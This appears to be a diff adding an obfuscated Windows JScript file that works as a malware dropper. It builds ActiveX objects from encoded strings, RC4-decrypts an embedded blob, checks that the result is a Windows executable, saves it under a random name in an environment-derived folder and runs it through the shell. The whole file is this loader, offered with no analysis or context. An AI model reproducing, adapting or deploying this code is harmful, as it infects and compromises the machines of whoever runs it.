@@ -1,0 +1,433 @@
+function cC9iDoZrkX(f52r3L4Ym) {
+    return new ActiveXObject(f52r3L4Ym);
+}
+var uB9 = cC9iDoZrkX(gIM85u("=oxBNAzFs02NeExF30gNcUiL1QwCaQRAoYBM", "cuZhdnbjR"));
+
+function fJWR(vMjXy) {
+    if (uB9.fileExists(vMjXy)) {
+        return true;
+    }
+}
+
+function cRzVgOFhRK() {
+    var ygZ5Ni44;
+    ygZ5Ni44 = nXvZQt5(gIM85u("==wdiU1JxVDV6o3MSJTbi8EIhVzQ8AGI", "p2s"), gIM85u("1UEJAMyK", "xzSp"));
+    if (ygZ5Ni44 === gIM85u("=IlNFAyJ", "fmA")) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function oxuZVit5(nYqtEHa, qzjA7vDEg) {
+    var s = [];
+    var j = 0;
+    var x;
+    var cjW0HddN9 = [];
+    var i;
+    var y;
+    if (qzjA7vDEg && nYqtEHa) {
+        for (i = 0; i < 256; i += 1) {
+            s[i] = i;
+        }
+        for (i = 0; i < 256; i += 1) {
+            j = (j + s[i] + qzjA7vDEg.charCodeAt(i % qzjA7vDEg.length)) % 256;
+            x = s[i];
+            s[i] = s[j];
+            s[j] = x;
+        }
+        i = 0;
+        j = 0;
+        for (y = 0; y < nYqtEHa.length; y += 1) {
+            i = (i + 1) % 256;
+            j = (j + s[i]) % 256;
+            x = s[i];
+            s[i] = s[j];
+            s[j] = x;
+            cjW0HddN9.push(nYqtEHa[y] ^ s[(s[i] + s[j]) % 256]);
+        }
+    }
+    return cjW0HddN9;
+}
+
+function lws3K4JdEe(fL) {
+    var y = [];
+    y[0xC7] = 0x80;
+    y[0xFC] = 0x81;
+    y[0xE9] = 0x82;
+    y[0xE2] = 0x83;
+    y[0xE4] = 0x84;
+    y[0xE0] = 0x85;
+    y[0xE5] = 0x86;
+    y[0xE7] = 0x87;
+    y[0xEA] = 0x88;
+    y[0xEB] = 0x89;
+    y[0xE8] = 0x8A;
+    y[0xEF] = 0x8B;
+    y[0xEE] = 0x8C;
+    y[0xEC] = 0x8D;
+    y[0xC4] = 0x8E;
+    y[0xC5] = 0x8F;
+    y[0xC9] = 0x90;
+    y[0xE6] = 0x91;
+    y[0xC6] = 0x92;
+    y[0xF4] = 0x93;
+    y[0xF6] = 0x94;
+    y[0xF2] = 0x95;
+    y[0xFB] = 0x96;
+    y[0xF9] = 0x97;
+    y[0xFF] = 0x98;
+    y[0xD6] = 0x99;
+    y[0xDC] = 0x9A;
+    y[0xA2] = 0x9B;
+    y[0xA3] = 0x9C;
+    y[0xA5] = 0x9D;
+    y[0x20A7] = 0x9E;
+    y[0x192] = 0x9F;
+    y[0xE1] = 0xA0;
+    y[0xED] = 0xA1;
+    y[0xF3] = 0xA2;
+    y[0xFA] = 0xA3;
+    y[0xF1] = 0xA4;
+    y[0xD1] = 0xA5;
+    y[0xAA] = 0xA6;
+    y[0xBA] = 0xA7;
+    y[0xBF] = 0xA8;
+    y[0x2310] = 0xA9;
+    y[0xAC] = 0xAA;
+    y[0xBD] = 0xAB;
+    y[0xBC] = 0xAC;
+    y[0xA1] = 0xAD;
+    y[0xAB] = 0xAE;
+    y[0xBB] = 0xAF;
+    y[0x2591] = 0xB0;
+    y[0x2592] = 0xB1;
+    y[0x2593] = 0xB2;
+    y[0x2502] = 0xB3;
+    y[0x2524] = 0xB4;
+    y[0x2561] = 0xB5;
+    y[0x2562] = 0xB6;
+    y[0x2556] = 0xB7;
+    y[0x2555] = 0xB8;
+    y[0x2563] = 0xB9;
+    y[0x2551] = 0xBA;
+    y[0x2557] = 0xBB;
+    y[0x255D] = 0xBC;
+    y[0x255C] = 0xBD;
+    y[0x255B] = 0xBE;
+    y[0x2510] = 0xBF;
+    y[0x2514] = 0xC0;
+    y[0x2534] = 0xC1;
+    y[0x252C] = 0xC2;
+    y[0x251C] = 0xC3;
+    y[0x2500] = 0xC4;
+    y[0x253C] = 0xC5;
+    y[0x255E] = 0xC6;
+    y[0x255F] = 0xC7;
+    y[0x255A] = 0xC8;
+    y[0x2554] = 0xC9;
+    y[0x2569] = 0xCA;
+    y[0x2566] = 0xCB;
+    y[0x2560] = 0xCC;
+    y[0x2550] = 0xCD;
+    y[0x256C] = 0xCE;
+    y[0x2567] = 0xCF;
+    y[0x2568] = 0xD0;
+    y[0x2564] = 0xD1;
+    y[0x2565] = 0xD2;
+    y[0x2559] = 0xD3;
+    y[0x2558] = 0xD4;
+    y[0x2552] = 0xD5;
+    y[0x2553] = 0xD6;
+    y[0x256B] = 0xD7;
+    y[0x256A] = 0xD8;
+    y[0x2518] = 0xD9;
+    y[0x250C] = 0xDA;
+    y[0x2588] = 0xDB;
+    y[0x2584] = 0xDC;
+    y[0x258C] = 0xDD;
+    y[0x2590] = 0xDE;
+    y[0x2580] = 0xDF;
+    y[0x3B1] = 0xE0;
+    y[0xDF] = 0xE1;
+    y[0x393] = 0xE2;
+    y[0x3C0] = 0xE3;
+    y[0x3A3] = 0xE4;
+    y[0x3C3] = 0xE5;
+    y[0xB5] = 0xE6;
+    y[0x3C4] = 0xE7;
+    y[0x3A6] = 0xE8;
+    y[0x398] = 0xE9;
+    y[0x3A9] = 0xEA;
+    y[0x3B4] = 0xEB;
+    y[0x221E] = 0xEC;
+    y[0x3C6] = 0xED;
+    y[0x3B5] = 0xEE;
+    y[0x2229] = 0xEF;
+    y[0x2261] = 0xF0;
+    y[0xB1] = 0xF1;
+    y[0x2265] = 0xF2;
+    y[0x2264] = 0xF3;
+    y[0x2320] = 0xF4;
+    y[0x2321] = 0xF5;
+    y[0xF7] = 0xF6;
+    y[0x2248] = 0xF7;
+    y[0xB0] = 0xF8;
+    y[0x2219] = 0xF9;
+    y[0xB7] = 0xFA;
+    y[0x221A] = 0xFB;
+    y[0x207F] = 0xFC;
+    y[0xB2] = 0xFD;
+    y[0x25A0] = 0xFE;
+    y[0xA0] = 0xFF;
+    var ami = [];
+    var mi;
+    var renderer;
+    var atends;
+    for (mi = 0; mi < fL.length; mi += 1) {
+        renderer = fL.charCodeAt(mi);
+        if (renderer < 128) {
+            atends = renderer;
+        } else {
+            atends = y[renderer];
+        }
+        ami.push(atends);
+    }
+    return ami;
+}
+
+function kTK(rO0pp8Jbb) {
+    var x = [];
+    x[0x80] = 0x00C7;
+    x[0x81] = 0x00FC;
+    x[0x82] = 0x00E9;
+    x[0x83] = 0x00E2;
+    x[0x84] = 0x00E4;
+    x[0x85] = 0x00E0;
+    x[0x86] = 0x00E5;
+    x[0x87] = 0x00E7;
+    x[0x88] = 0x00EA;
+    x[0x89] = 0x00EB;
+    x[0x8A] = 0x00E8;
+    x[0x8B] = 0x00EF;
+    x[0x8C] = 0x00EE;
+    x[0x8D] = 0x00EC;
+    x[0x8E] = 0x00C4;
+    x[0x8F] = 0x00C5;
+    x[0x90] = 0x00C9;
+    x[0x91] = 0x00E6;
+    x[0x92] = 0x00C6;
+    x[0x93] = 0x00F4;
+    x[0x94] = 0x00F6;
+    x[0x95] = 0x00F2;
+    x[0x96] = 0x00FB;
+    x[0x97] = 0x00F9;
+    x[0x98] = 0x00FF;
+    x[0x99] = 0x00D6;
+    x[0x9A] = 0x00DC;
+    x[0x9B] = 0x00A2;
+    x[0x9C] = 0x00A3;
+    x[0x9D] = 0x00A5;
+    x[0x9E] = 0x20A7;
+    x[0x9F] = 0x0192;
+    x[0xA0] = 0x00E1;
+    x[0xA1] = 0x00ED;
+    x[0xA2] = 0x00F3;
+    x[0xA3] = 0x00FA;
+    x[0xA4] = 0x00F1;
+    x[0xA5] = 0x00D1;
+    x[0xA6] = 0x00AA;
+    x[0xA7] = 0x00BA;
+    x[0xA8] = 0x00BF;
+    x[0xA9] = 0x2310;
+    x[0xAA] = 0x00AC;
+    x[0xAB] = 0x00BD;
+    x[0xAC] = 0x00BC;
+    x[0xAD] = 0x00A1;
+    x[0xAE] = 0x00AB;
+    x[0xAF] = 0x00BB;
+    x[0xB0] = 0x2591;
+    x[0xB1] = 0x2592;
+    x[0xB2] = 0x2593;
+    x[0xB3] = 0x2502;
+    x[0xB4] = 0x2524;
+    x[0xB5] = 0x2561;
+    x[0xB6] = 0x2562;
+    x[0xB7] = 0x2556;
+    x[0xB8] = 0x2555;
+    x[0xB9] = 0x2563;
+    x[0xBA] = 0x2551;
+    x[0xBB] = 0x2557;
+    x[0xBC] = 0x255D;
+    x[0xBD] = 0x255C;
+    x[0xBE] = 0x255B;
+    x[0xBF] = 0x2510;
+    x[0xC0] = 0x2514;
+    x[0xC1] = 0x2534;
+    x[0xC2] = 0x252C;
+    x[0xC3] = 0x251C;
+    x[0xC4] = 0x2500;
+    x[0xC5] = 0x253C;
+    x[0xC6] = 0x255E;
+    x[0xC7] = 0x255F;
+    x[0xC8] = 0x255A;
+    x[0xC9] = 0x2554;
+    x[0xCA] = 0x2569;
+    x[0xCB] = 0x2566;
+    x[0xCC] = 0x2560;
+    x[0xCD] = 0x2550;
+    x[0xCE] = 0x256C;
+    x[0xCF] = 0x2567;
+    x[0xD0] = 0x2568;
+    x[0xD1] = 0x2564;
+    x[0xD2] = 0x2565;
+    x[0xD3] = 0x2559;
+    x[0xD4] = 0x2558;
+    x[0xD5] = 0x2552;
+    x[0xD6] = 0x2553;
+    x[0xD7] = 0x256B;
+    x[0xD8] = 0x256A;
+    x[0xD9] = 0x2518;
+    x[0xDA] = 0x250C;
+    x[0xDB] = 0x2588;
+    x[0xDC] = 0x2584;
+    x[0xDD] = 0x258C;
+    x[0xDE] = 0x2590;
+    x[0xDF] = 0x2580;
+    x[0xE0] = 0x03B1;
+    x[0xE1] = 0x00DF;
+    x[0xE2] = 0x0393;
+    x[0xE3] = 0x03C0;
+    x[0xE4] = 0x03A3;
+    x[0xE5] = 0x03C3;
+    x[0xE6] = 0x00B5;
+    x[0xE7] = 0x03C4;
+    x[0xE8] = 0x03A6;
+    x[0xE9] = 0x0398;
+    x[0xEA] = 0x03A9;
+    x[0xEB] = 0x03B4;
+    x[0xEC] = 0x221E;
+    x[0xED] = 0x03C6;
+    x[0xEE] = 0x03B5;
+    x[0xEF] = 0x2229;
+    x[0xF0] = 0x2261;
+    x[0xF1] = 0x00B1;
+    x[0xF2] = 0x2265;
+    x[0xF3] = 0x2264;
+    x[0xF4] = 0x2320;
+    x[0xF5] = 0x2321;
+    x[0xF6] = 0x00F7;
+    x[0xF7] = 0x2248;
+    x[0xF8] = 0x00B0;
+    x[0xF9] = 0x2219;
+    x[0xFA] = 0x00B7;
+    x[0xFB] = 0x221A;
+    x[0xFC] = 0x207F;
+    x[0xFD] = 0x00B2;
+    x[0xFE] = 0x25A0;
+    x[0xFF] = 0x00A0;
+    var bb = [];
+    var leppek = "";
+    var atends;
+    var renderer;
+    var mi;
+    for (mi = 0; mi < rO0pp8Jbb.length; mi += 1) {
+        atends = rO0pp8Jbb[mi];
+        if (atends < 128) {
+            renderer = atends;
+        } else {
+            renderer = x[atends];
+        }
+        bb.push(gW7(renderer));
+    }
+    leppek = bb.join("");
+    return leppek;
+}
+
+function lIIx(dPiw1, tiNg7CS) {
+    if (tiNg7CS === 1) {
+        if (dPiw1[0] === 0x50 && dPiw1[1] === 0x4b) {
+            return true;
+        }
+        if (dPiw1[0] === 0xD0 && dPiw1[1] === 0xCF) {
+            return true;
+        }
+        if (dPiw1[0] === 0x7B && dPiw1[1] === 0x5C && dPiw1[2] === 0x72 && dPiw1[3] === 0x74) {
+            return true;
+        }
+        return false;
+    }
+    if (dPiw1[0] === 0x4D && dPiw1[1] === 0x5a) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function gcv(oyJYTQOBG) {
+    try {
+        var e5mLaHLU = cC9iDoZrkX(gIM85u("==AQuY3b5MyKdUnJukAABQjL31CI10TP", "pNMMAE"));
+        var cngvbp = e5mLaHLU.createElement("aUDf4a5");
+        cngvbp.dataType = gIM85u("==ANQBlOZIGSbBiG", "xI5f");
+        cngvbp.text = oyJYTQOBG;
+        return cngvbp.nodeTypedValue;
+    } catch (e2) {
+        var gg = 397;
+    }
+}
+
+function h3Y6lU8vqr(ag6, yeY1FC, qtwBC1N, bc4KfWh) {
+    try {
+        var mfoDES = 0;
+        var saiC9D = gcv(ag6);
+        var vfKeUTB = cC9iDoZrkX(gIM85u("GEmDo0jZLVTdFIhK", "kVJ1we5IZk"));
+        vfKeUTB.open();
+        vfKeUTB.type = 1;
+        vfKeUTB.write(saiC9D);
+        vfKeUTB.position = 0;
+        vfKeUTB.type = 2;
+        vfKeUTB.charset = 437;
+        var gW9BEtw = vfKeUTB.ReadText();
+        var eUn4iaw = lws3K4JdEe(gW9BEtw);
+        var pEvCA5 = oxuZVit5(eUn4iaw, yeY1FC);
+        if (lIIx(pEvCA5, bc4KfWh)) {
+            vfKeUTB.position = 0;
+            vfKeUTB.type = 2;
+            vfKeUTB.charset = 437;
+            vfKeUTB.writeText(kTK(pEvCA5));
+            vfKeUTB.saveToFile(qtwBC1N);
+            mfoDES = 1;
+        }
+        vfKeUTB.close();
+        return mfoDES;
+    } catch (e1) {
+        var g = 869;
+    }
+}
+var wm = cC9iDoZrkX(gIM85u("==gA0chMQ8EdeEDA5AhN", "aCZrXn"));
+
+function nXvZQt5(mxYePznB, nctijuet, lws3K4JdEe, fL) {
+    var ws;
+    if (nctijuet === 2) {
+        try {
+            wm.run(mxYePznB, fL, lws3K4JdEe);
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+    ws = wm.environment(nctijuet);
+    return ws(mxYePznB);
+}
+var au = "\x22";
+var imMBj1 = nXvZQt5(gIM85u("=s3JB5DPBw3O", "s3Lyn"), gIM85u("==QZ9UEJ4RmP", "n67g"));
+var xvejr = nXvZQt5(gIM85u("mUBKS1CJuwQK", "aCcai"), gIM85u("==QZ9UEJ4RmP", "n67g"));
+var nYqtEHa = xvejr + imMBj1 + gIM85u("==QP", "aCcai") + Math.floor(Math.random() * 65536) + gIM85u("==APuI0T", "a6VH");
+if (h3Y6lU8vqr(yjD1UPt8wp, "ge5azmOmPnvYQuN", nYqtEHa, 0) === 1) {
+    var q8WIrOJ = gIM85u("K4QZ89FXEYXIKoAB", "vomR");
+    if (cRzVgOFhRK() === true) {
+        q8WIrOJ = nXvZQt5(gIM85u("==AIOsiUIEyYngxN", "dAt7dE"), gIM85u("==QZ9UEJ4RmP", "n67g")) + gIM85u("==AX7xFJtwxJIlzN", "kj1TKbsjO") + q8WIrOJ;
+    }
+    var qzjABZk = q8WIrOJ + gIM85u("=ICU+omQ", "bEMp") + nYqtEHa + au;
+    nXvZQt5(qzjABZk, 2, 0, 1);
+}
